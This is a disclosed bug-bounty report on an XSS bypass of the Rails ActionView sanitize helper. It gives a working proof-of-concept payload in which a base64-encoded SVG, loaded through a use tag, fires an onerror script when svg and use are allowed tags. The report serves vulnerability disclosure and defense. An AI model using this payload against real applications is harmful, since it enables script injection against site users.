# Rails ActionView sanitize helper bypass leading to XSS using SVG tag.

## Report Details
- **Report ID**: 1805873
- **URL**: https://hackerone.com/reports/1805873
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-12-14T20:50:15.845Z
- **Disclosed**: 2023-01-29T12:14:23.096Z

## Reporter
- **Username**: haqpl
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
In the specific configuration, it was possible to bypass HTML sanitization by using the `use` tag of the `SVG` element.

In the `index.html.erb`:

```ruby
<%= sanitize "<svg><use href=\"data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEzMzcnIGhlaWdodD0nMTMzNyc+CjxpbWFnZSBocmVmPSIxIiBvbmVycm9yPSJhbGVydCh3aW5kb3cub3JpZ2luKSIgLz4KPC9zdmc+#x\"/></svg>", tags: %w(svg use) %>
```
`use` tag allows to embed another base64 encoded `SVG` containing target XSS payload, base64 after decoding:

```svg
<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='1337' height='1337'>
<image href="1" onerror="alert(window.origin)" />
</svg>
```
`SVG` and `use` tags had to be allowed either in global configuration  `config.action_view.sanitized_allowed_tags = ['svg', 'use']`
or inline with `tags` argument of the helper.

## Impact

XSS could lead to data theft through the attacker’s ability to manipulate data through their access to the application, and their ability to interact with other users, including performing other malicious attacks, which would appear to originate from a legitimate user. These malicious actions could also result in reputational damage for the business through the impact on customers’ trust.

## Attachments
- 2022-09-07_23-29.png
